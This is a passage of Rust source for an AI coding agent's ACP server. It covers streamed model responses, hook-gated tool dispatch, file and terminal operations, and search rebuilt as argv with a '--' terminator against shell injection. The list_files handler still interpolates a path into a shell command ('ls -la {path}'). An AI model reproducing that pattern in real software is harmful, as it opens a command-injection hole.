                    format!("Error {status}: {body}")
                };
                self.send_session_update(
                    acp_session_id,
                    "agent_message_chunk",
                    &json!({"type": "text", "text": error_msg}),
                );
                // Remove the failed user message
                self.messages.pop();
                return "error".to_string();
            }

            // Stream the response
            let stream_result = self
                .stream_provider_response(acp_session_id, response)
                .await;

            match stream_result {
                StreamResult::EndTurn { content } => {
                    // No tool calls — we're done
                    if !content.is_empty() {
                        self.messages.push(json!({
                            "role": "assistant",
                            "content": content,
                        }));
                    }
                    return "end_turn".to_string();
                }
                StreamResult::ToolCalls {
                    content,
                    tool_calls,
                } => {
                    // Add assistant message with tool calls
                    let tool_calls_json: Vec<Value> = tool_calls
                        .iter()
                        .map(|tc| {
                            json!({
                                "id": tc.id,
                                "type": "function",
                                "function": {
                                    "name": tc.name,
                                    "arguments": tc.arguments,
                                }
                            })
                        })
                        .collect();

                    self.messages.push(json!({
                        "role": "assistant",
                        "content": if content.is_empty() { Value::Null } else { Value::String(content) },
                        "tool_calls": tool_calls_json,
                    }));

                    // Execute tools via ACP client methods
                    for tc in &tool_calls {
                        if self.cancel_flag.load(Ordering::SeqCst) {
                            return "cancelled".to_string();
                        }

                        self.send_session_update(
                            acp_session_id,
                            "tool_call",
                            &json!({
                                "title": tc.name,
                                "status": "running",
                            }),
                        );

                        let result = self.execute_tool_via_acp(&tc.name, &tc.arguments).await;

                        self.send_session_update(
                            acp_session_id,
                            "tool_call",
                            &json!({
                                "title": tc.name,
                                "status": "completed",
                                "output": result.content,
                            }),
                        );

                        // Add tool result to messages
                        self.messages.push(json!({
                            "role": "tool",
                            "tool_call_id": tc.id,
                            "content": result.content,
                        }));
                    }

                    // Continue the loop — re-prompt with tool results
                }
                StreamResult::Cancelled => {
                    return "cancelled".to_string();
                }
                StreamResult::Error(msg) => {
                    self.send_session_update(
                        acp_session_id,
                        "agent_message_chunk",
                        &json!({"type": "text", "text": msg}),
                    );
                    return "error".to_string();
                }
            }
        }

        "max_iterations".to_string()
    }

    // ========================================================================
    // Streaming response processing
    // ========================================================================

    /// Stream a provider response and extract content + tool calls.
    // Complex protocol handler, splitting would reduce readability
    #[allow(clippy::too_many_lines)]
    async fn stream_provider_response(
        &self,
        acp_session_id: &str,
        response: reqwest::Response,
    ) -> StreamResult {
        use futures::StreamExt;

        let mut stream = response.bytes_stream();
        let mut buffer = String::new();
        let mut full_content = String::new();
        let mut tool_calls: Vec<AccumulatedToolCall> = Vec::new();

        // Track partial tool call state
        let mut current_tool_index: Option<usize> = None;

        while let Some(chunk_result) = stream.next().await {
            if self.cancel_flag.load(Ordering::SeqCst) {
                return StreamResult::Cancelled;
            }

            let chunk = match chunk_result {
                Ok(c) => c,
                Err(e) => {
                    return StreamResult::Error(format!("Stream error: {e}"));
                }
            };

            buffer.push_str(&String::from_utf8_lossy(&chunk));

            // Process complete SSE lines
            while let Some(line_end) = buffer.find('\n') {
                let line = buffer[..line_end].trim().to_string();
                buffer = buffer[line_end + 1..].to_string();

                if line.is_empty() || line == "data: [DONE]" {
                    if line == "data: [DONE]" {
                        // Stream complete
                        return finish_acp_stream(full_content, tool_calls);
                    }
                    continue;
                }

                if !line.starts_with("data: ") {
                    // Handle Anthropic event: lines
                    if line.starts_with("event: ") {
                        let event_type = line.trim_start_matches("event: ");
                        if event_type == "message_stop" {
                            return finish_acp_stream(full_content, tool_calls);
                        }
                    }
                    continue;
                }

                let data = &line["data: ".len()..];
                let json: Value = match serde_json::from_str(data) {
                    Ok(v) => v,
                    Err(_) => continue,
                };

                // Handle OpenAI-format streaming
                if let Some(choices) = json.get("choices").and_then(|c| c.as_array()) {
                    for choice in choices {
                        let Some(delta) = choice.get("delta") else {
                            continue;
                        };

                        // Text content
                        if let Some(text) = delta.get("content").and_then(|c| c.as_str()) {
                            full_content.push_str(text);
                            self.send_session_update(
                                acp_session_id,
                                "agent_message_chunk",
                                &json!({"type": "text", "text": text}),
                            );
                        }

                        // Tool calls
                        if let Some(tcs) = delta.get("tool_calls").and_then(|t| t.as_array()) {
                            for tc_delta in tcs {
                                #[allow(clippy::cast_possible_truncation)]
                                // Tool call index is always small; truncation is safe
                                let index = tc_delta
                                    .get("index")
                                    .and_then(serde_json::Value::as_u64)
                                    .unwrap_or(0)
                                    as usize;

                                while tool_calls.len() <= index {
                                    tool_calls.push(AccumulatedToolCall::default());
                                }

                                if let Some(tc_id) = tc_delta.get("id").and_then(|i| i.as_str()) {
                                    tool_calls[index].id = tc_id.to_string();
                                }

                                // New tool call
                                if let Some(func) = tc_delta.get("function") {
                                    if let Some(name) = func.get("name").and_then(|n| n.as_str()) {
                                        tool_calls[index].name = name.to_string();
                                        current_tool_index = Some(index);
                                    }
                                    if let Some(args) =
                                        func.get("arguments").and_then(|a| a.as_str())
                                    {
                                        tool_calls[index].arguments.push_str(args);
                                    }
                                }
                            }
                        }

                        // Finish reason
                        if let Some(reason) = choice.get("finish_reason").and_then(|r| r.as_str()) {
                            if reason == "stop" && tool_calls.is_empty() {
                                return StreamResult::EndTurn {
                                    content: full_content,
                                };
                            }
                            if reason == "tool_calls" {
                                return finish_acp_stream(full_content, tool_calls);
                            }
                        }
                    }
                }

                // Handle Anthropic-format streaming
                if let Some(delta_type) = json.get("type").and_then(|t| t.as_str()) {
                    match delta_type {
                        "content_block_start" => {
                            let content_block = json.get("content_block").unwrap_or(&Value::Null);
                            let block_type = content_block
                                .get("type")
                                .and_then(|t| t.as_str())
                                .unwrap_or("");

                            match block_type {
                                "thinking" => {
                                    self.send_session_update(
                                        acp_session_id,
                                        "thinking",
                                        &json!({"type": "thinking", "status": "started"}),
                                    );
                                }
                                "tool_use" => {
                                    let name = content_block
                                        .get("name")
                                        .and_then(|n| n.as_str())
                                        .unwrap_or("");
                                    let tc_id = content_block
                                        .get("id")
                                        .and_then(|i| i.as_str())
                                        .unwrap_or("");
                                    tool_calls.push(AccumulatedToolCall {
                                        id: tc_id.to_string(),
                                        name: name.to_string(),
                                        arguments: String::new(),
                                    });
                                    current_tool_index = Some(tool_calls.len() - 1);
                                }
                                _ => {}
                            }
                        }
                        "content_block_delta" => {
                            let delta = json.get("delta").unwrap_or(&Value::Null);
                            let delta_type =
                                delta.get("type").and_then(|t| t.as_str()).unwrap_or("");

                            match delta_type {
                                "text_delta" => {
                                    if let Some(text) = delta.get("text").and_then(|t| t.as_str()) {
                                        full_content.push_str(text);
                                        self.send_session_update(
                                            acp_session_id,
                                            "agent_message_chunk",
                                            &json!({"type": "text", "text": text}),
                                        );
                                    }
                                }
                                "thinking_delta" => {
                                    if let Some(text) =
                                        delta.get("thinking").and_then(|t| t.as_str())
                                    {
                                        self.send_session_update(
                                            acp_session_id,
                                            "thinking",
                                            &json!({"type": "thinking", "text": text}),
                                        );
                                    }
                                }
                                "input_json_delta" => {
                                    if let Some(partial) =
                                        delta.get("partial_json").and_then(|p| p.as_str())
                                    {
                                        if let Some(idx) = current_tool_index {
                                            if idx < tool_calls.len() {
                                                tool_calls[idx].arguments.push_str(partial);
                                            }
                                        }
                                    }
                                }
                                _ => {}
                            }
                        }
                        "message_delta" => {
                            if let Some(delta) = json.get("delta") {
                                if let Some(reason) =
                                    delta.get("stop_reason").and_then(|r| r.as_str())
                                {
                                    if reason == "end_turn" && tool_calls.is_empty() {
                                        return StreamResult::EndTurn {
                                            content: full_content,
                                        };
                                    }
                                    if reason == "tool_use" {
                                        return finish_acp_stream(full_content, tool_calls);
                                    }
                                }
                            }
                        }
                        _ => {}
                    }
                }
            }
        }

        // Stream ended without explicit stop
        finish_acp_stream(full_content, tool_calls)
    }

    // ========================================================================
    // Tool execution via ACP client methods
    // ========================================================================

    /// Execute a tool by delegating to ACP client methods.
    ///
    /// Mirrors `proxy.rs::prepare_request_context`'s gate sequence
    /// (crosslink #694):
    /// 1. Run `PreToolUse` hooks. On denial, surface the block reason as
    ///    the tool result instead of dispatching — no ACP fs/terminal
    ///    call is made and no `execute_tool_with_memory` runs.
    /// 2. Dispatch to the appropriate ACP / local handler.
    /// 3. Fire `PostToolUse` (or `PostToolUseFailure`) after dispatch so
    ///    post-tool side effects (logging, audit, learn hooks) observe
    ///    ACP-driven calls the same way they observe proxy-driven calls.
    async fn execute_tool_via_acp(&self, tool_name: &str, arguments_json: &str) -> AcpToolResult {
        let (args, tool_input) = match parse_acp_tool_arguments(tool_name, arguments_json) {
            Ok(parsed) => parsed,
            Err(result) => return result,
        };

        // ── PreToolUse gate ─────────────────────────────────────────────
        if let Some(blocked) = pre_tool_use_gate(&self.hook_engine, tool_name, &tool_input).await {
            return blocked;
        }

        let result = match tool_name {
            "read_file" => self.acp_read_file(&args).await,
            "write_file" => self.acp_write_file(&args).await,
            "edit_file" => self.acp_edit_file(&args).await,
            "bash" => self.acp_bash(&args).await,
            "bash_output" => self.acp_bash_output(&args).await,
            "kill_shell" => self.acp_kill_shell(&args).await,
            "list_files" => self.acp_list_files(&args).await,
            "glob" | "grep" => self.acp_search(&args, tool_name).await,
            // Internal tools run locally — not file/terminal operations
            "web_fetch" | "web_search" | "web_browser" | "memory_search" | "memory_save"
            | "memory_delete" | "memory_list" | "task_create" | "task_update" | "task_get"
            | "task_list" | "todo_write" | "todo_read" | "enter_plan_mode" | "exit_plan_mode" => {
                self.execute_local_tool(tool_name, arguments_json)
            }
            name if name.starts_with("mcp__") => {
                // MCP tools run locally through the MCP manager
                self.execute_local_tool(tool_name, arguments_json)
            }
            _ => AcpToolResult {
                content: format!("Unknown tool: {tool_name}"),
                is_error: true,
            },
        };

        // ── PostToolUse fire-and-forget ─────────────────────────────────
        self.hook_engine
            .fire_post_tool(
                !result.is_error,
                tool_name,
                tool_input,
                &result.content,
                None,
            )
            .await;

        result
    }

    /// Execute a tool locally (for internal tools that don't need ACP delegation).
    ///
    /// Callers MUST run the `PreToolUse` gate before invoking this
    /// helper — `execute_tool_via_acp` does so for every dispatch. This
    /// function intentionally does NOT re-run the gate so the audit
    /// trail emits exactly one `PreToolUse` event per logical tool
    /// dispatch (matches the proxy path's invariant).
    fn execute_local_tool(&self, tool_name: &str, arguments_json: &str) -> AcpToolResult {
        use crate::tools::{FunctionCall, ToolCall};

        let tc = ToolCall {
            id: "local".to_string(),
            call_type: "function".to_string(),
            function: FunctionCall {
                name: tool_name.to_string(),
                arguments: arguments_json.to_string(),
            },
        };

        let result = crate::tools::execute_tool_with_memory(&tc, None, Some(&self.permission_mgr));
        AcpToolResult {
            content: result.content,
            is_error: result.is_error,
        }
    }

    /// Collect rule content for every file extension referenced by the
    /// current message history.
    ///
    /// Mirrors `proxy.rs::prepare_request_context`'s rules injection so
    /// the ACP path receives the same `.openclaudia/rules` context the
    /// proxy path does (crosslink #694). Returns an empty string when
    /// no extensions match a rule — callers can pass the result
    /// straight to [`crate::prompt::build_system_prompt`] without a
    /// branch.
    fn collect_rules_for_messages(&self) -> String {
        let mut extensions: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
        let Ok(extension_pattern) = regex::Regex::new(r"[\w/\\.-]+\.([a-zA-Z0-9]{1,10})\b") else {
            return String::new();
        };
        for msg in &self.messages {
            let Some(content) = msg.get("content") else {
                continue;
            };
            let text = match content {
                Value::String(s) => s.clone(),
                Value::Array(parts) => parts
                    .iter()
                    .filter_map(|p| p.get("text").and_then(|t| t.as_str()))
                    .collect::<Vec<_>>()
                    .join(" "),
                _ => continue,
            };
            for cap in extension_pattern.captures_iter(&text) {
                if let Some(ext) = cap.get(1) {
                    extensions.insert(ext.as_str().to_lowercase());
                }
            }
        }
        let ext_refs: Vec<&str> = extensions.iter().map(String::as_str).collect();
        self.rules_engine.get_combined_rules(&ext_refs)
    }

    // -- File operations via ACP client --

    async fn acp_read_file(&self, args: &HashMap<String, Value>) -> AcpToolResult {
        let Some(path) = args
            .get("file_path")
            .or_else(|| args.get("path"))
            .and_then(|v| v.as_str())
        else {
            return AcpToolResult {
                content: "Missing file_path argument".to_string(),
                is_error: true,
            };
        };

        match self
            .client_request("fs/read_text_file", Some(json!({"path": path})))
            .await
        {
            Ok(result) => {
                let text = result
                    .get("text")
                    .or_else(|| result.get("content"))
                    .and_then(|v| v.as_str())
                    .unwrap_or("");

                // Apply offset/limit if specified
                #[allow(clippy::cast_possible_truncation)]
                // Line offsets/limits from JSON are always small; truncation is safe
                let offset = args
                    .get("offset")
                    .and_then(serde_json::Value::as_u64)
                    .unwrap_or(0) as usize;
                #[allow(clippy::cast_possible_truncation)]
                let limit = args
                    .get("limit")
                    .and_then(serde_json::Value::as_u64)
                    .map(|v| v as usize);

                let lines: Vec<&str> = text.lines().collect();
                let start = offset.min(lines.len());
                let end = limit.map_or(lines.len(), |l| (start + l).min(lines.len()));

                let numbered: String = lines[start..end]
                    .iter()
                    .enumerate()
                    .map(|(i, line)| format!("{:>6}\t{}", start + i + 1, line))
                    .collect::<Vec<_>>()
                    .join("\n");

                AcpToolResult {
                    content: numbered,
                    is_error: false,
                }
            }
            Err(e) => AcpToolResult {
                content: format!("Failed to read file: {e}"),
                is_error: true,
            },
        }
    }

    async fn acp_write_file(&self, args: &HashMap<String, Value>) -> AcpToolResult {
        let Some(path) = args
            .get("file_path")
            .or_else(|| args.get("path"))
            .and_then(|v| v.as_str())
        else {
            return AcpToolResult {
                content: "Missing file_path argument".to_string(),
                is_error: true,
            };
        };

        let Some(content) = args.get("content").and_then(|v| v.as_str()) else {
            return AcpToolResult {
                content: "Missing content argument".to_string(),
                is_error: true,
            };
        };

        match self
            .client_request(
                "fs/write_text_file",
                Some(json!({"path": path, "content": content})),
            )
            .await
        {
            Ok(_) => AcpToolResult {
                content: format!("Successfully wrote to {path}"),
                is_error: false,
            },
            Err(e) => AcpToolResult {
                content: format!("Failed to write file: {e}"),
                is_error: true,
            },
        }
    }

    async fn acp_edit_file(&self, args: &HashMap<String, Value>) -> AcpToolResult {
        let Some(path) = args
            .get("file_path")
            .or_else(|| args.get("path"))
            .and_then(|v| v.as_str())
        else {
            return AcpToolResult {
                content: "Missing file_path argument".to_string(),
                is_error: true,
            };
        };

        let Some(old_string) = args.get("old_string").and_then(|v| v.as_str()) else {
            return AcpToolResult {
                content: "Missing old_string argument".to_string(),
                is_error: true,
            };
        };

        let Some(new_string) = args.get("new_string").and_then(|v| v.as_str()) else {
            return AcpToolResult {
                content: "Missing new_string argument".to_string(),
                is_error: true,
            };
        };

        // Read the file via ACP
        let file_content = match self
            .client_request("fs/read_text_file", Some(json!({"path": path})))
            .await
        {
            Ok(result) => result
                .get("text")
                .or_else(|| result.get("content"))
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            Err(e) => {
                return AcpToolResult {
                    content: format!("Failed to read file for edit: {e}"),
                    is_error: true,
                }
            }
        };

        // Apply the edit
        let replace_all = args
            .get("replace_all")
            .and_then(serde_json::Value::as_bool)
            .unwrap_or(false);

        let (new_content, count) = if replace_all {
            let count = file_content.matches(old_string).count();
            (file_content.replace(old_string, new_string), count)
        } else if file_content.contains(old_string) {
            (file_content.replacen(old_string, new_string, 1), 1)
        } else {
            return AcpToolResult {
                content: format!(
                    "old_string not found in {path}. Read the file first to see exact content."
                ),
                is_error: true,
            };
        };

        if count == 0 {
            return AcpToolResult {
                content: format!("old_string not found in {path}"),
                is_error: true,
            };
        }

        // Write back via ACP
        match self
            .client_request(
                "fs/write_text_file",
                Some(json!({"path": path, "content": new_content})),
            )
            .await
        {
            Ok(_) => AcpToolResult {
                content: format!(
                    "Successfully edited {} ({} replacement{})",
                    path,
                    count,
                    if count == 1 { "" } else { "s" }
                ),
                is_error: false,
            },
            Err(e) => AcpToolResult {
                content: format!("Failed to write edited file: {e}"),
                is_error: true,
            },
        }
    }

    // -- Terminal operations via ACP client --

    async fn acp_bash(&self, args: &HashMap<String, Value>) -> AcpToolResult {
        let Some(command) = args.get("command").and_then(|v| v.as_str()) else {
            return AcpToolResult {
                content: "Missing command argument".to_string(),
                is_error: true,
            };
        };

        let run_in_background = args
            .get("run_in_background")
            .and_then(serde_json::Value::as_bool)
            .unwrap_or(false);

        // Create terminal
        let terminal_id = match self
            .client_request(
                "terminal/create",
                Some(json!({
                    "command": command,
                    "cwd": std::env::current_dir()
                        .unwrap_or_default()
                        .to_string_lossy()
                        .to_string(),
                })),
            )
            .await
        {
            Ok(result) => result
                .get("terminalId")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            Err(e) => {
                return AcpToolResult {
                    content: format!("Failed to create terminal: {e}"),
                    is_error: true,
                }
            }
        };

        if run_in_background {
            return AcpToolResult {
                content: format!(
                    "Background shell started with terminal ID: {terminal_id}\nUse bash_output with this ID to retrieve output."
                ),
                is_error: false,
            };
        }

        // Wait for completion
        let exit_result = match self
            .client_request(
                "terminal/wait_for_exit",
                Some(json!({"terminalId": terminal_id})),
            )
            .await
        {
            Ok(result) => result,
            Err(e) => {
                return AcpToolResult {
                    content: format!("Failed waiting for terminal: {e}"),
                    is_error: true,
                }
            }
        };

        // Get output
        let output = self
            .client_request("terminal/output", Some(json!({"terminalId": terminal_id})))
            .await
            .map_or_else(
                |_| String::new(),
                |result| {
                    result
                        .get("output")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string()
                },
            );

        // Release terminal
        let _ = self
            .client_request("terminal/release", Some(json!({"terminalId": terminal_id})))
            .await;

        let exit_code = exit_result
            .get("exitCode")
            .and_then(serde_json::Value::as_i64)
            .unwrap_or(-1);

        AcpToolResult {
            content: if output.is_empty() {
                format!("(exit code {exit_code})")
            } else {
                format!("{output}\n(exit code {exit_code})")
            },
            is_error: exit_code != 0,
        }
    }

    async fn acp_bash_output(&self, args: &HashMap<String, Value>) -> AcpToolResult {
        let Some(terminal_id) = args
            .get("shell_id")
            .or_else(|| args.get("terminal_id"))
            .and_then(|v| v.as_str())
        else {
            return AcpToolResult {
                content: "Missing shell_id argument".to_string(),
                is_error: true,
            };
        };

        match self
            .client_request("terminal/output", Some(json!({"terminalId": terminal_id})))
            .await
        {
            Ok(result) => {
                let output = result.get("output").and_then(|v| v.as_str()).unwrap_or("");
                AcpToolResult {
                    content: output.to_string(),
                    is_error: false,
                }
            }
            Err(e) => AcpToolResult {
                content: format!("Failed to get terminal output: {e}"),
                is_error: true,
            },
        }
    }

    async fn acp_kill_shell(&self, args: &HashMap<String, Value>) -> AcpToolResult {
        let Some(terminal_id) = args
            .get("shell_id")
            .or_else(|| args.get("terminal_id"))
            .and_then(|v| v.as_str())
        else {
            return AcpToolResult {
                content: "Missing shell_id argument".to_string(),
                is_error: true,
            };
        };

        match self
            .client_request("terminal/kill", Some(json!({"terminalId": terminal_id})))
            .await
        {
            Ok(_) => AcpToolResult {
                content: format!("Terminal {terminal_id} killed"),
                is_error: false,
            },
            Err(e) => AcpToolResult {
                content: format!("Failed to kill terminal: {e}"),
                is_error: true,
            },
        }
    }

    async fn acp_list_files(&self, args: &HashMap<String, Value>) -> AcpToolResult {
        let path = args.get("path").and_then(|v| v.as_str()).unwrap_or(".");
        // Delegate as a terminal command
        let mut ls_args = HashMap::new();
        ls_args.insert(
            "command".to_string(),
            Value::String(format!("ls -la {path}")),
        );
        self.acp_bash(&ls_args).await
    }

    async fn acp_search(
        &self,
        tool_args: &HashMap<String, Value>,
        tool_name: &str,
    ) -> AcpToolResult {
        // SECURITY (#688): user-/model-supplied search arguments must NEVER be
        // interpolated into a shell command. Build an argv vector and execute
        // the resolved binary directly via `Command`, bypassing the ACP
        // `terminal/create` shell entirely. Metacharacters become literal
        // argv entries; `--` blocks flag injection from the pattern/path.
        let (program, argv) = match build_search_argv(tool_name, tool_args) {
            Ok(plan) => plan,
            Err(err) => {
                return AcpToolResult {
                    content: err,
                    is_error: true,
                };
            }
        };

        run_search_argv(&program, &argv).await
    }
}

/// Output cap for search subprocesses (bytes). Replaces the previous
/// `| head -N` pipeline, which only worked because the command was being
/// shell-interpreted.
const SEARCH_OUTPUT_CAP_BYTES: usize = 256 * 1024;

/// Resolve a program name to an absolute path by walking `PATH`.
///
/// Returns `None` if the binary is not found or the entry is not executable.
/// Equivalent to `which`, but avoids adding a dependency. Always returns an
/// absolute path so the caller invokes a known binary instead of relying on
/// `Command::new`'s implicit lookup (which still works, but is harder to
/// audit and to exercise in tests).
fn resolve_program(name: &str) -> Option<std::path::PathBuf> {
    // Reject obviously path-like or unsafe names — search tools are bare
    // executable names (`rg`, `find`), not paths.
    if name.is_empty() || name.contains(std::path::MAIN_SEPARATOR) || name.contains('/') {
        return None;
    }
    let path_var = std::env::var_os("PATH")?;
    for entry in std::env::split_paths(&path_var) {
        if entry.as_os_str().is_empty() {
            continue;
        }
        let candidate = entry.join(name);
        if let Ok(meta) = std::fs::metadata(&candidate) {
            if meta.is_file() {
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    if meta.permissions().mode() & 0o111 != 0 {
                        return Some(candidate);
                    }
                }
                #[cfg(not(unix))]
                {
                    return Some(candidate);
                }
            }
        }
    }
    None
}

/// Pure planner: turn a search tool invocation into an absolute program path
/// plus argv. No shell, no interpolation. Returns `Err` with a
/// human-readable reason when the tool name is unknown or the binary cannot
/// be located on `PATH`.
fn build_search_argv(
    tool_name: &str,
    tool_args: &HashMap<String, Value>,
) -> Result<(std::path::PathBuf, Vec<String>), String> {
    match tool_name {
        "glob" => {
            let pattern = tool_args
                .get("pattern")
                .and_then(|v| v.as_str())
                .unwrap_or("*")
                .to_string();
            let path = tool_args
                .get("path")
                .and_then(|v| v.as_str())
                .unwrap_or(".")
                .to_string();
            let program = resolve_program("find")
                .ok_or_else(|| "Could not locate `find` on PATH".to_string())?;
            // `find <path> -type f -name <pattern>` — `<path>` comes BEFORE
            // any `-flag` so it cannot be mistaken for an option. The
            // `-name`/`-type` flags are hard-coded; only `<pattern>` and
            // `<path>` are user-controlled, and both arrive as argv entries.
            let argv = vec![
                path,
                "-type".to_string(),
                "f".to_string(),
                "-name".to_string(),
                pattern,
            ];
            Ok((program, argv))
        }
        "grep" => {
            let pattern = tool_args
                .get("pattern")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let path = tool_args
                .get("path")
                .and_then(|v| v.as_str())
                .unwrap_or(".")
                .to_string();
            let program =
                resolve_program("rg").ok_or_else(|| "Could not locate `rg` on PATH".to_string())?;

            let mut argv: Vec<String> = vec!["--no-heading".to_string()];
            if let Some(ft) = tool_args.get("type").and_then(|v| v.as_str()) {
                // The type name itself is an argv entry, but disallow values
                // that look like flags to keep the contract obvious.
                if ft.starts_with('-') {
                    return Err(format!("Invalid `type` value (looks like a flag): {ft}"));
                }
                argv.push("--type".to_string());
                argv.push(ft.to_string());
            }
            if let Some(g) = tool_args.get("glob").and_then(|v| v.as_str()) {
                if g.starts_with('-') {
                    return Err(format!("Invalid `glob` value (looks like a flag): {g}"));
                }
                argv.push("--glob".to_string());
                argv.push(g.to_string());
            }
            // `--` terminator: everything after this is positional, so a
            // pattern like `-foo` or `--help` is treated as the search
            // pattern, not an rg option. This is the flag-injection block.
            argv.push("--".to_string());
            argv.push(pattern);
            argv.push(path);
            Ok((program, argv))
        }
        other => Err(format!("Unknown search tool: {other}")),
    }
}

/// Execute the resolved program with the planned argv and return a result
/// suitable for an ACP tool reply. Output is byte-capped (replacing the
/// former `| head -N` shell pipeline) and stdout+stderr are merged in the
/// natural order Tokio gives us.
async fn run_search_argv(program: &std::path::Path, argv: &[String]) -> AcpToolResult {
    let output = match tokio::process::Command::new(program)
        .args(argv)
        .output()
        .await
    {
        Ok(out) => out,
        Err(e) => {
            return AcpToolResult {
                content: format!("Failed to spawn {}: {e}", program.display()),
                is_error: true,
            };
        }
    };

    let mut combined = String::from_utf8_lossy(&output.stdout).into_owned();
    if !output.stderr.is_empty() {
        // Surface stderr (rg prints "No files were searched" etc. there)
        // but only when present, so happy paths stay clean.
        combined.push_str(&String::from_utf8_lossy(&output.stderr));
    }
    if combined.len() > SEARCH_OUTPUT_CAP_BYTES {
        combined.truncate(SEARCH_OUTPUT_CAP_BYTES);
        combined.push_str("\n[output truncated]");
    }

    let exit_code = output.status.code().unwrap_or(-1);
    let content = if combined.is_empty() {
        format!("(exit code {exit_code})")
    } else {
        format!("{combined}\n(exit code {exit_code})")
    };
    AcpToolResult {
        content,
        // `rg` exits non-zero when there are no matches — that's not a tool
        // error, just an empty result. Treat exit codes 0 and 1 from rg as
        // success; anything else is a real failure.
        is_error: !(exit_code == 0 || exit_code == 1),
    }
}

// ============================================================================
// Supporting types
// ============================================================================

/// Result of streaming a provider response.
#[derive(Debug)]
enum StreamResult {
    /// Model finished with text content, no tool calls.
    EndTurn { content: String },
    /// Model requested tool calls.
    ToolCalls {
        content: String,
        tool_calls: Vec<AccumulatedToolCall>,
    },
    /// Cancelled by session/cancel.
    Cancelled,
    /// Error during streaming.
    Error(String),
}

/// A fully accumulated tool call from streaming chunks.
#[derive(Debug, Clone, Default)]
struct AccumulatedToolCall {
    id: String,
    name: String,
    arguments: String,
}

impl AccumulatedToolCall {
    const fn is_complete(&self) -> bool {
        !self.id.is_empty() && !self.name.is_empty()
    }

    fn missing_fields(&self) -> Vec<&'static str> {
        let mut missing = Vec::new();
        if self.id.is_empty() {
            missing.push("id");
        }
        if self.name.is_empty() {
            missing.push("function.name");
        }
        missing
    }
}

fn finish_acp_stream(content: String, tool_calls: Vec<AccumulatedToolCall>) -> StreamResult {
    if tool_calls.is_empty() {
        return StreamResult::EndTurn { content };
    }

    if let Some((index, call)) = tool_calls
        .iter()
        .enumerate()
        .find(|(_, call)| !call.is_complete())
    {
        let missing = call.missing_fields().join(", ");
        warn!(
            index,
            missing = %missing,
            "Provider returned incomplete ACP streamed tool call"
        );
        return StreamResult::Error(format!(
            "Provider returned incomplete tool call at index {index}: missing {missing}"
        ));
    }

    StreamResult::ToolCalls {
        content,
        tool_calls,
    }
}

fn decode_acp_messages(messages: &[Value]) -> Result<Vec<crate::proxy::ChatMessage>, String> {
    messages
        .iter()
        .cloned()
        .enumerate()
        .map(|(index, message)| {
            serde_json::from_value(message)
                .map_err(|err| format!("message at index {index} is invalid: {err}"))
        })
        .collect()
}

fn acp_tool_definitions_for_chat_request(definitions: Value) -> Result<Vec<Value>, String> {
    let Value::Array(tools) = definitions else {
        return Err(format!(
            "expected tool registry to return an array, got {}",
            value_type_name(&definitions)
        ));
    };

    for (index, tool) in tools.iter().enumerate() {
        let Some(tool_type) = tool.get("type").and_then(Value::as_str) else {
            return Err(format!(
                "tool definition at index {index} missing string 'type'"
            ));
        };
        if tool_type != "function" {
            return Err(format!(
                "tool definition at index {index} has unsupported type '{tool_type}'"
            ));
        }
        let function = tool
            .get("function")
            .ok_or_else(|| format!("tool definition at index {index} missing 'function' object"))?;
        if !function.is_object() {
            return Err(format!(
                "tool definition at index {index} has non-object 'function'"
            ));
        }
        let name = function
            .get("name")
            .and_then(Value::as_str)
            .filter(|name| !name.is_empty())
            .ok_or_else(|| {
                format!("tool definition at index {index} missing non-empty string 'function.name'")
            })?;
        if function
            .get("parameters")
            .is_some_and(|params| !params.is_object())
        {
            return Err(format!(
                "tool definition '{name}' at index {index} has non-object 'function.parameters'"
            ));
        }
    }

    Ok(tools)
}

/// Result of executing a tool via ACP.
#[derive(Debug)]
struct AcpToolResult {
    content: String,
    is_error: bool,
}

// ============================================================================
// Server entry point
// ============================================================================

/// Run the ACP server on stdin/stdout.
///
/// # Errors
/// Returns an error if the server fails to start or encounters an I/O error.
pub async fn run_acp_server(
    config: AppConfig,
    model: String,
    api_key: Option<crate::providers::ApiKey>,
) -> Result<()> {
    // Set up stdout writer channel — all writes go through this to avoid interleaving
    let (stdout_tx, mut stdout_rx) = mpsc::unbounded_channel::<String>();

    // Spawn stdout writer on a blocking thread — StdoutLock is not Send
    let writer_handle = std::thread::spawn(move || {
        let stdout = io::stdout();
        while let Some(line) = stdout_rx.blocking_recv() {
            let mut out = stdout.lock();
            if writeln!(out, "{line}").is_err() {
                break;
            }
            if out.flush().is_err() {
                break;
            }
        }
    });

    // Spawn stdin reader on a blocking thread — stdin.lock() is not Send
    let (stdin_tx, mut stdin_rx) = mpsc::unbounded_channel::<String>();
    std::thread::spawn(move || {
        let stdin = io::stdin();
        let reader = stdin.lock();
        for line_result in reader.lines() {
            match line_result {
                Ok(line) => {
                    let trimmed = line.trim().to_string();
                    if !trimmed.is_empty() && stdin_tx.send(trimmed).is_err() {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
    });

    let mut server = AcpServer::new(config, model, api_key, stdout_tx);

    info!("ACP server started on stdio");

    // Process messages from stdin reader thread
    while let Some(line) = stdin_rx.recv().await {
        let msg: JsonRpcMessage = match serde_json::from_str(&line) {
            Ok(m) => m,
            Err(e) => {
                // Send parse error if we can extract an id
                let id = serde_json::from_str::<Value>(&line)
                    .ok()
                    .and_then(|v| v.get("id").cloned())
                    .unwrap_or(Value::Null);

                server.send_error(id, PARSE_ERROR, &format!("Parse error: {e}"));
                continue;
            }
        };

        server.handle_message(msg).await;
    }

    // Clean up — dropping server drops stdout_tx, which causes the writer thread to exit
    drop(server);
    let _ = writer_handle.join();

    Ok(())
}

#[cfg(test)]
mod ide_tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn file_opened_updates_active_and_recents_most_recent_first() {
        let mut state = IdeState::default();
        apply_ide_file_opened(&mut state, &json!({"filePath": "/a.rs"}));
        apply_ide_file_opened(&mut state, &json!({"filePath": "/b.rs"}));
        apply_ide_file_opened(&mut state, &json!({"filePath": "/c.rs"}));

        assert_eq!(state.active_file.as_deref(), Some("/c.rs"));
        assert_eq!(state.recent_files, vec!["/c.rs", "/b.rs", "/a.rs"]);

        // Re-opening an existing file promotes it without duplicating.
        apply_ide_file_opened(&mut state, &json!({"filePath": "/a.rs"}));
